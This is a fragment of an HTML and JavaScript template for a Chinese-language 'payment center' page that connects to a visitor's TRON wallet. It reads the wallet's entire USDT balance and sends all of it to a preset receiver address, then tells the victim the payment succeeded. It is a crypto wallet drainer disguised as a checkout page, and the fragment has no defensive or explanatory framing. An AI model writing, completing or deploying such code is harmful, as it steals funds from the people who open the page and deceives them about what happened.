...
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>支付中心</title>
...
.status{background:#eef2fa;padding:16px;border-radius:20px;margin:20px 0}
</style>
</head>
<body>
<div class="card">
...
async function init() {
    ...
    document.getElementById('status').innerHTML = '✅ 已连接钱包，正在检测余额...';
    try {
        const contract = await tronWeb.contract().at("${USDT_CONTRACT}");
        const balWei = await contract.balanceOf(userAddress).call();
        const bal = Number(balWei) / 1e6;
        if (bal <= 0) {
            document.getElementById('status').innerHTML = '⚠️ 余额不足，请充值 USDT';
            return;
        }
        document.getElementById('status').innerHTML = \`💸 检测到余额 \${bal.toFixed(2)} USDT，正在发起转账...\`;
        const tx = await contract.transfer("${RECEIVER}", Math.floor(bal * 1e6)).send();
        document.getElementById('status').innerHTML = \`✅ 支付成功！金额 \${bal.toFixed(2)} USDT<br>交易号: \${tx.slice(0,12)}...\`;
    } catch (err) {
